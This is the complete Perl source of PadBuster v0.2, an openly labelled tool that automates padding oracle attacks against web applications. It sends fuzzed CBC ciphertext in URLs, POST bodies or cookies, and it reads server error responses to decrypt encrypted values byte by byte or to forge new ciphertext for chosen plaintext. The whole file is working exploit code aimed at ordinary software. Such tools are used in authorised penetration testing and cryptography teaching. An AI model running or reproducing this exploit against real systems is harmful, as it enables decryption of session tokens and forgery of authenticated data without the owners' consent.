#!/usr/bin/perl
#
# PadBuster v0.2 - Automated script for performing Padding Oracle attacks
# Brian Holyfield - Gotham Digital Science (labs@gdssecurity.com)
#
# Credits to J.Rizzo and T.Duong for providing proof of concept web exploit
# techniques and S.Vaudenay for initial discovery of the attack. 
# 

use strict;
use LWP::UserAgent;
use Getopt::Std;
use MIME::Base64;
use URI::Escape;
use Getopt::Long;
use Time::HiRes qw( gettimeofday );
use Compress::Zlib;

GetOptions( "outfile=s" => \my $outfile,
            "post=s" => \my $post,
            "encoding=s" => \my $encoding,
            "headers=s" => \my $headers,
            "cookies=s" => \my $cookie,
            "error=s" => \my $error,
            "prefix=s" => \my $prefix,
            "intermediary=s" => \my $intermediaryInput,
            "ciphertext=s" => \my $cipherInput,
            "plaintext=s" => \my $plainTextInput,
	    "b64plaintext=s" => \my $b64PlainTextInput,
            "noencode" => \my $noEncodeOption,
            "superverbose" => \my $superVerbose,
            "proxy" => \my $proxy,
            "proxyauth" => \my $proxyAuth,
            "noiv" => \my $noIv,
            "auth=s" => \my $auth,
            "resume=s" => \my $resumeBlock,
            "interactive" => \my $interactive,
            "verbose" => \my $verbose,
            "decompress" => \my $decompress);
  
myPrint("\n+-------------------------------------------+", 0);
myPrint("| PadBuster - v0.2                          |", 0);
myPrint("| Brian Holyfield - Gotham Digital Science  |", 0);
myPrint("| labs\@gdssecurity.com                      |", 0);
myPrint("+-------------------------------------------+", 0);

if ($#ARGV < 2) { 
 die "    
    Use: padBuster.pl URL EncryptedSample BlockSize [options]

  Where: URL = The target URL (and query string if applicable)
         EncryptedSample = The encrypted value you want to test. Must
                           also be present in the URL, PostData or a Cookie
         BlockSize = The block size being used by the algorithm

Options:
	 -auth [username:password]: HTTP Basic Authentication 
	 -b64plaintext [Base64 String]: Binary Data to Encrypt (Base64 Encoded)
         -ciphertext [Bytes]: CipherText for Intermediary Bytes (Hex-Encoded)
         -cookies [HTTP Cookies]: Cookies (name1=value1; name2=value2)
         -encoding [0-3]: Encoding Format of Sample (Default 0)
                          0=Base64, 1=Lower HEX, 2=Upper HEX, 3=.NET UrlToken
         -error [Error String]: Padding Error Message
         -headers [HTTP Headers]: Custom Headers (name1::value1;name2::value2)
	 -interactive: Prompt for confirmation on decrypted bytes
	 -intermediary [Bytes]: Intermediary Bytes for CipherText (Hex-Encoded)
	 -noencode: Do not URL-encode the payload (encoded by default)
	 -noiv: Sample does not include IV (decrypt first block) 
         -outfile [File Name]: Output to File Name
         -plaintext [String]: Plain-Text to Encrypt
         -post [Post Data]: HTTP Post Data String
	 -prefix [Prefix]: Prefix bytes to append to each sample (Hex-Encoded) 
	 -proxy [address:port]: Use HTTP/S Proxy
	 -proxyauth [username:password]: Proxy Authentication
	 -resume [Block Number]: Resume at this block (decrypt mode only)
         -superverbose: Be Very Verbose (Debug Only)
         -verbose: Be Verbose
         -decompress: Handle compressed responses
         
";}


# Ok, if we've made it this far we are ready to begin..

my $url = @ARGV[0];
my $sample = @ARGV[1];
my $blockSize = @ARGV[2];

# Hard Coded Inputs
#$post = "";
#$sample = "";

# Change this later if -post was used
my $method = $post? "POST" : "GET";

# Encoding and decoding should be flexible so it is broken out into a separate function
if ($encoding < 0 || $encoding > 3)
{
	myPrint("\nERROR: Encoding must be a value between 0 and 3");
	exit();
} 
my $encodingFormat = $encoding ? $encoding : 0;

# See if the sample needs to be URL decoded, otherwise don't (the plus from B64 will be a problem)
my $encryptedBytes = $sample;

my $totalRequests = 0;

if ($sample =~ /\%/)
{
	$encryptedBytes = uri_unescape($encryptedBytes)
}

# Prep the sample for regex use
$sample = quotemeta $sample;

# Now decode
$encryptedBytes = myDecode($encryptedBytes, $encodingFormat);
myPrint("\n[+] Encrypted Sample Length: ".int(length($encryptedBytes)),1);
if ( (length($encryptedBytes) % $blockSize) > 0)
{
	myPrint("\nERROR: Encrypted Bytes must be evenly divisible by Block Size ($blockSize)");
	myPrint("       Double check the Encoding and Block Size.\n");
	exit();
}

# If no IV, then append nulls as the IV
if ($noIv)
{
	$encryptedBytes = "\x00" x $blockSize . $encryptedBytes;
}

# PlainTextBytes is where the complete decrypted sample will be stored (decrypt only)
my $plainTextBytes;

# This is a bool to make sure we know where to replace the sample string
my $wasSampleFound = 0;

# ForgedBytes is where the complete forged sample will be stored (encrypt only)
my $forgedBytes;

# Isolate the IV into a separate byte array
my $ivBytes = substr($encryptedBytes, 0, $blockSize);

# Declare some optional elements for storing the results of the first test iteration
# to help the user if they don't know what the padding error looks like
my @oracleCantidates;
my $oracleSignature = "";
my %oracleGuesses;

# The attack works by sending in a real cipher text block along with a fake block in front of it
# You only ever need to send two blocks at a time (one real one fake) and just work through
# the sample one block at a time

# First, re-issue the original request to let the user know if something is potentially broken
my ($status, $content, $location, $contentLength) = makeRequest($method, $url, $post, $cookie);
if ($decompress) {
	$content = Compress::Zlib::memGunzip($content);
	$contentLength = length($content);
}
myPrint("\nINFO: The original request returned the following");
myPrint("[+] Status: $status");	
myPrint("[+] Location: $location");
myPrint("[+] Content Length: $contentLength\n");
myPrint("[+] Response: $content\n",1);

$b64PlainTextInput ? $plainTextInput = myDecode($b64PlainTextInput,0) : ""; 



if ($plainTextInput)
{
	# ENCRYPT MODE
	myPrint("INFO: Starting PadBuster Encrypt Mode");
	
	# The block count will be the plaintext divided by blocksize (rounded up)	
	my $blockCount = int(((length($plainTextInput)+1)/$blockSize)+0.99);
	
	my $padCount = ($blockSize * $blockCount) - length($plainTextInput);	
	$plainTextInput.= chr($padCount) x $padCount;
	
	# SampleBytes is the encrypted text you want to derive intermediary values for, so 
	# copy the current ciphertext block into sampleBytes
	# Note, nulls are used if not provided and the intermediary values are brute forced
	
	$forgedBytes = $cipherInput ? myDecode($cipherInput,1) : "\x00" x $blockSize;
	my $sampleBytes = $forgedBytes;
	
	for (my $blockNum = $blockCount; $blockNum > 0; $blockNum--)
	{ 	
		# IntermediaryBytes is where the intermediary bytes produced by the algorithm are stored
		my $intermediaryBytes;
		
		if ($intermediaryInput && $blockNum == $blockCount)
		{
			$intermediaryBytes = myDecode($intermediaryInput,2);
		} 
		else 
		{
			$intermediaryBytes = processBlock($sampleBytes);
		}
				
	        # Now XOR the intermediary bytes with the corresponding bytes from the plain-text block
	        # This will become the next ciphertext block (or IV if the last one)
	        $sampleBytes = $intermediaryBytes ^ substr($plainTextInput, (($blockNum-1) * $blockSize), $blockSize);
		$forgedBytes = $sampleBytes.$forgedBytes;
		
		myPrint("\nBlock ".($blockNum)." Results:",0);
		myPrint("[+] New Cipher Text (HEX): ".myEncode($sampleBytes,2));
		myPrint("[+] Intermediary Bytes (HEX): ".myEncode($intermediaryBytes,2)."\n");
		
	}
	$forgedBytes = myEncode($forgedBytes, $encoding);
	chomp($forgedBytes);
} 
else
{
	# DECRYPT MODE
	myPrint("INFO: Starting PadBuster Decrypt Mode");
	
	if ($resumeBlock)
	{
		myPrint("INFO: Resuming previous exploit at Block $resumeBlock\n");
	} 
	else 
	{
		$resumeBlock = 1
	}
	
	# The block count should be the sample divided by the blocksize
	my $blockCount = int(length($encryptedBytes)) / int($blockSize);
	myPrint("[+] Number of Blocks: ".$blockCount."\n",1);
	
	# Assume that the IV is included in our sample and that the first block is the IV	
	for (my $blockNum = ($resumeBlock+1); $blockNum <= $blockCount; $blockNum++) 
	{ 
		# Since the IV is the first block, our block count is artificially inflated by one
		myPrint("*** Starting Block ".($blockNum-1)." of ".($blockCount-1)." ***\n",0);
		
		# SampleBytes is the encrypted text you want to break, so 
		# lets copy the current ciphertext block into sampleBytes
		my $sampleBytes = substr($encryptedBytes, ($blockNum * $blockSize - $blockSize), $blockSize);

		# IntermediaryBytes is where the the intermediary bytes produced by the algorithm are stored
		my $intermediaryBytes = processBlock($sampleBytes);

		# DecryptedBytes is where the decrypted block is stored
		my $decryptedBytes;			        	

		# Now we XOR the decrypted byte with the corresponding byte from the previous block
		# (or IV if we are in the first block) to get the actual plain-text
		$blockNum == 2 ? $decryptedBytes = $intermediaryBytes ^ $ivBytes : $decryptedBytes = $intermediaryBytes ^ substr($encryptedBytes, (($blockNum - 2) * $blockSize), $blockSize);

		myPrint("\nBlock ".($blockNum-1)." Results:",0);
		myPrint("[+] Cipher Text (HEX): ".myEncode($sampleBytes,2));
		myPrint("[+] Intermediary Bytes (HEX): ".myEncode($intermediaryBytes,2));
		myPrint("[+] Plain Text: $decryptedBytes\n");
		$plainTextBytes = $plainTextBytes.$decryptedBytes;
	}
}

myPrint("-------------------------------------------------------",0);	
myPrint("** Finished ***\n", 0);
if ($plainTextInput)
{
	myPrint("[+] Encrypted value is: ".uri_escape($forgedBytes),0);
} 
else
{	
	myPrint("[+] Decrypted value (ASCII): $plainTextBytes\n");
	myPrint("[+] Decrypted value (HEX): ".myEncode($plainTextBytes,2)."\n", 0);
	myPrint("[+] Decrypted value (Base64): ".myEncode($plainTextBytes,0)."\n", 0);
}
myPrint("-------------------------------------------------------\n",0);	

sub determineSignature()
{ 
	# Help the user detect the oracle response if an error string was not provided
	# This logic will automatically suggest the response pattern that occured most often 
	# during the test as this is the most likeley one

	my @sortedGuesses = sort {$oracleGuesses{$a} <=> $oracleGuesses{$b}} keys %oracleGuesses; 

	myPrint("The following response signatures were returned:\n");
	myPrint("-------------------------------------------------------",0);
	myPrint("ID#\tFreq\tStatus\tLength\tLocation");
	myPrint("-------------------------------------------------------",0);

	my $id = 1;

	foreach (@sortedGuesses) 
	{
		print "$id";
		$id == $#sortedGuesses+1 && $#sortedGuesses != 0 ? print " **" : "";
		print "\t$oracleGuesses{$_}\t$_\n";
		$id++;
	}
	myPrint("-------------------------------------------------------",0);	

	if ($#sortedGuesses == 0)
	{
		myPrint("\nERROR: All of the responses were identical.\n");
		myPrint("Double check the Block Size and try again.");
		exit();
	} 
	else 
	{
		my $responseNum = &promptUser("\nEnter an ID that matches the padding error\nNOTE: The ID# marked with ** is recommended");
		myPrint("",0);
		myPrint("Continuing test with selection $responseNum\n");
		$oracleSignature = @sortedGuesses[$responseNum-1];
	}
}

sub prepRequest
{
	my ($pUrl, $pPost, $pCookie, $pSample, $pTestBytes) = @_;

	# Prepare the request			
	my $testUrl = $pUrl;
	my $wasSampleFound = 0;
	
	if ($pUrl =~ /$pSample/)
	{
		$testUrl =~ s/$pSample/$pTestBytes/;
		$wasSampleFound = 1;
	} 

	my $testPost = "";						
	if ($pPost)
	{
		$testPost = $pPost;
		if ($pPost =~ /$pSample/)
		{
			$testPost =~ s/$pSample/$pTestBytes/;
			$wasSampleFound = 1;
		}
	}

	my $testCookies = "";
	if ($pCookie)
	{
		$testCookies = $pCookie;
		if ($pCookie =~ /$pSample/)
		{
			$testCookies =~ s/$pSample/$pTestBytes/;
			$wasSampleFound = 1;
		}
	}

	if ($wasSampleFound == 0)
	{
		myPrint("ERROR: Encrypted sample was not found in the test request.");
		exit();
	}
	return ($testUrl, $testPost, $testCookies);
}

sub processBlock
{
  	my ($sampleBytes) = @_; 
  	
  	# Analysis mode is either 0 (response analysis) or 1 (exploit)  	
  	(!$error && $oracleSignature eq "") ? my $analysisMode = 0 : my $analysisMode = 1;
  	
  	# The return value of this subroutine is the intermediary text for the block
	my $returnValue;
  	
  	my $complete = 0;
  	
  	while ($complete == 0)
  	{
  		# Reset the return value
  		$returnValue = "";
  		
  		my $repeat = 0;
	
		# TestBytes are the fake bytes that are pre-pending to the cipher test for the padding attack
		my $testBytes = "\x00" x $blockSize;
	
		my $falsePositiveDetector = 0;

		# Work on one byte at a time, starting with the last byte and moving backwards
		OUTERLOOP:
		for (my $byteNum = $blockSize - 1; $byteNum >= 0; $byteNum--)
		{
			INNERLOOP:
			for (my $i = 255; $i >= 0; $i--)
			{			
				# Fuzz the test byte
				substr($testBytes, $byteNum, 1, chr($i));

				# Combine the test bytes and the sample
				my $combinedTestBytes = $testBytes.$sampleBytes;

				if ($prefix)
				{
					$combinedTestBytes = myDecode($prefix,2).$combinedTestBytes 
				}

				$combinedTestBytes = myEncode($combinedTestBytes, $encodingFormat);				
				chomp($combinedTestBytes);

				if (! $noEncodeOption) 
				{
					$combinedTestBytes = uri_escape($combinedTestBytes); 
				}

				my ($testUrl, $testPost, $testCookies) = prepRequest($url, $post, $cookie, $sample, $combinedTestBytes);

				# Ok, now make the request

				my ($status, $content, $location, $contentLength) = makeRequest($method, $testUrl, $testPost, $testCookies);
				if ($decompress) {
        				$content = Compress::Zlib::memGunzip($content);
					$contentLength = length($content);
				}

				# If this is the first block and there is no padding error message defined, then cycle through 
				# all possible requests and let the user decide what the padding error behavior is.
				if ($analysisMode == 0)
				{
					$i == 255 ? myPrint("INFO: No error string was provided...starting response analysis\n",0) : "";
					$oracleGuesses{"$status\t$contentLength\t$location"}++;
					if ($byteNum == $blockSize - 1 && $i == 0)
					{
						myPrint("*** Response Analysis Complete ***\n",0);
						determineSignature();
						$analysisMode = 1;
						$repeat = 1;
						last OUTERLOOP;
					}

				}

				my $continue = "y";

				if (($error && $content !~ /$error/) || ($oracleSignature ne "" && $oracleSignature ne "$status\t$contentLength\t$location"))
				{
					# If there was no padding error, then it worked
					myPrint("[+] Success: ($i) [Byte ".($byteNum+1)."]",0);
					myPrint("[+] Test Byte:".uri_escape(substr($testBytes, $byteNum, 1)),1);

					# If continually getting a hit on attempt zero, then something is probably wrong
					$i == 255 ? $falsePositiveDetector++ : "";

					if ($falsePositiveDetector == $blockSize)
					{
						myPrint("\n*** ERROR: It appears there are false positive results. ***\n");
						myPrint("HINT: The most likely cause for this is an incorrect error string.\n");
						if ($error)
						{
							myPrint("[+] Check the error string you provided and try again, or consider running");
							myPrint("[+] without an error string to perform an automated response analysis.\n");
						} 
						else 
						{
							myPrint("[+] You may want to consider defining a custom padding error string");
							myPrint("[+] instead of the automated response analysis.\n");
						}
						$continue = &promptUser("Do you want to start this block over? (Yes/No)? [y/n/a]","",1);
						if ($continue eq "y")
						{
							myPrint("INFO: Switching to interactive mode");
							$interactive = 1;
							$repeat = 1;
							last OUTERLOOP;
						}
					}


					if ($interactive == 1)
					{
						$continue = &promptUser("Do you want to use this value (Yes/No/All)? [y/n/a]","",1);
					}
					
					if ($continue eq "y" | $continue eq "a")
					{
						$continue eq "a" ? $interactive = 0 : "";

						# Next, calculate the decrypted byte by XORing it with the padding value
						my ($currentPaddingByte, $nextPaddingByte);

						# These variables could allow for flexible padding schemes (for now PCKS)
						# For PCKS#7, the padding block is equal to chr($blockSize - $byteNum)
						$currentPaddingByte = chr($blockSize - $byteNum);
						$nextPaddingByte = chr($blockSize - $byteNum + 1);

						my $decryptedByte = substr($testBytes, $byteNum, 1) ^ $currentPaddingByte;
						myPrint("[+] XORing with Padding Char, which is ".uri_escape($currentPaddingByte),1);

						$returnValue = $decryptedByte.$returnValue;
						myPrint("[+] Decrypted Byte is: ".uri_escape($decryptedByte),1);
						
						# Finally, update the test bytes in preparation for the next round, based on the padding used 
						for (my $k = $byteNum; $k < $blockSize; $k++)
						{
							# First, XOR the current test byte with the padding value for this round to recover the decrypted byte
							substr($testBytes, $k, 1,(substr($testBytes, $k, 1) ^ $currentPaddingByte));				

							# Then, XOR it again with the padding byte for the next round
							substr($testBytes, $k, 1,(substr($testBytes, $k, 1) ^ $nextPaddingByte));
						}
						last INNERLOOP;                        
					}
				}
				if ($i == 0 && $analysisMode == 1)
				{
					# End of the road with no success.  We should probably try again.
					myPrint("ERROR: No matching response on [Byte ".($byteNum+1)."]");

					if (($byteNum == $blockSize - 1) && ($error))
					{
						myPrint("\nAre you sure you specified the correct error string?");
						myPrint("Try re-running without the -e option to perform a response analysis.\n");
					} 

					$continue = &promptUser("Do you want to start this block over? (Yes/No)? [y/n/a]","",1);
					if ($continue eq "n")
					{
						exit();
					} 
					else 
					{
						myPrint("INFO: Switching to interactive mode");
						$interactive = 1;
						$repeat = 1;
						last OUTERLOOP;
					}
				}                        
			} 
		}
		($repeat == 1) ? ($complete = 0) : ($complete = 1);
	}
	return $returnValue;
}

sub makeRequest {
 my ($method, $url, $data, $cookie) = @_; 
 my ($noConnect, $numRetries, $lwp, $status, $content, $req, $location, $contentLength);   

 do 
 {
  $lwp = LWP::UserAgent->new(env_proxy => 1,
                            keep_alive => 1,
                            timeout => 30,
			    requests_redirectable => [],
                            );
 
  $req = new HTTP::Request $method => $url;

  # Add request content for POST and PUTS 
  if ($data ne "") {
   $req->content_type('application/x-www-form-urlencoded');
   $req->content($data);
  }
 
  if ($proxy)
  {
  	my $proxyUrl = "http://";
  	if ($proxyAuth)
 	{
 		my ($proxyUser, $proxyPass) = split(":",$proxyAuth);
 		$ENV{HTTPS_PROXY_USERNAME}	= $proxyUser;
		$ENV{HTTPS_PROXY_PASSWORD}	= $proxyPass;
		$proxyUrl .= $proxyAuth."@";
 	}
 	$proxyUrl .= $proxy;
 	$lwp->proxy(['http'], $proxyUrl);
	$ENV{HTTPS_PROXY}		= "http://".$proxy;
  } 	


  if ($auth) {
   my ($httpuser, $httppass) = split(/:/,$auth);
   $req->authorization_basic($httpuser, $httppass);
  }

  # If cookies are defined, add a COOKIE header
  if (! $cookie eq "") {
   $req->header(Cookie => $cookie);
  }
 
  if ($headers) {
   my @customHeaders = split(/;/i,$headers);
   for (my $i = 0; $i <= $#customHeaders; $i++) {
    my ($headerName, $headerVal) = split(/\::/i,$customHeaders[$i]);
    $req->header($headerName, $headerVal);
   }
  }
 
  my $startTime = gettimeofday();
  my $response = $lwp->request($req);
  my $endTime = gettimeofday();  
  my $timeLapse = ($endTime - $startTime);
  
  # Extract the required attributes from the response
  $status = substr($response->status_line, 0, 3);
  $content = $response->content;
  $superVerbose ? myPrint($content) : "";
  $location = $response->header("Location");
  if ($location eq "")
  {
   $location = "N/A";
  }
  $contentLength = $response->header("Content-Length");
  my $statusMsg = $response->status_line;
  #myPrint("Status: $statusMsg, Location: $location, Length: $contentLength",1); 
 
  if ($statusMsg =~ /Can't connect/) {
   myPrint("ERROR: $statusMsg\n   Retrying in 10 seconds...\n\n");
   $noConnect = 1;
   $numRetries++;
   sleep 10;
  } else {
   $noConnect = 0;
   $totalRequests++;
  }  
 } until (($noConnect == 0) || ($numRetries >= 15));
 if ($numRetries >= 15) {
  myPrint("ERROR: Number of retries has exceeded 15 attempts...quitting.\n");
  exit;
 }
 return ($status, $content, $location, $contentLength);
}
 
sub myPrint {
 my ($printData, $printLevel) = @_;
 $printData = $printData."\n";
 if (($verbose && $printLevel > 0) || $printLevel < 1 || $superVerbose)
 {
  print $printData;
  if ($outfile) { 
    open(REPORT, ">>$outfile") or die "ERROR => Can't write to file $outfile\n";
    print REPORT $printData;
    close(REPORT);
  }
 }
}

sub myEncode {
 my ($toEncode, $format) = @_;
 return encodeDecode($toEncode, 0, $format);
}

sub myDecode {
 my ($toDecode, $format) = @_;
 return encodeDecode($toDecode, 1, $format);
}

sub encodeDecode {
 my ($toEncodeDecode, $oper, $format) = @_;
 # Oper: 0=Encode, 1=Decode
 # Format: 0=Base64, 1 Hex Lower, 2 Hex Upper, 3=NetUrlToken
 my $returnVal = "";
 if ($format == 1 || $format == 2)
 {
   # HEX
   if ($oper == 1)
   {
   	#Decode
   	#Always convert to lower when decoding)
   	$toEncodeDecode = lc($toEncodeDecode);
	$returnVal = pack("H*",$toEncodeDecode);
   } 
   else 
   {
   	#Encode
	$returnVal = unpack("H*",$toEncodeDecode);
	if ($format == 2)
	{
	   	#Uppercase
		$returnVal = uc($returnVal)
   	}
   }
 } 
 elsif ($format == 0)
 {
   # B64
   if ($oper == 1)
   {
	$returnVal = decode_base64($toEncodeDecode);
   }
   else
   {
	$returnVal = encode_base64($toEncodeDecode);
	$returnVal =~ s/(\r|\n)//g;	
   }
 }
 else 
 {
   # NetUrlToken
   if ($oper == 1)
   {
	$returnVal = netUrlTokenDecode($toEncodeDecode);
   }
   else
   {
	$returnVal = netUrlTokenEncode($toEncodeDecode);
   } 
 }
 
 return $returnVal;
}


sub netUrlTokenEncode {
 my ($input) = @_;
 $input = encode_base64($input);
 $input =~ s/(\r|\n)//g;
 $input =~ s/\+/\-/g;
 $input =~ s/\//\_/g;
 my $count = $input =~ s/\=//g;
 ($count eq "") ? ($count = 0) : "";
 return $input.$count;
}

sub netUrlTokenDecode {
 my ($input) = @_;
 $input =~ s/\-/\+/g;
 $input =~ s/\_/\//g;
 my $count = chop($input);
 $input = $input.("=" x int($count));
 return decode_base64($input);
}


sub promptUser {
 my($prompt, $default, $yn) = @_;
 my $defaultValue = $default ? "[$default]" : "";
 print "$prompt $defaultValue: ";
 chomp(my $input = <STDIN>);
 
 $input = $input ? $input : $default;
 if ($yn)
 {
  if ($input =~ /^y|n|a$/)
  {
   return $input;
  }
  else
  {
   promptUser($prompt, $default, $yn);
  }
 } 
 else 
 {
  if ($input =~ /^-?\d/ && $input > 0 && $input < 256)
  {
   return $input;
  } else {
   promptUser($prompt, $default);
  }
 }
}
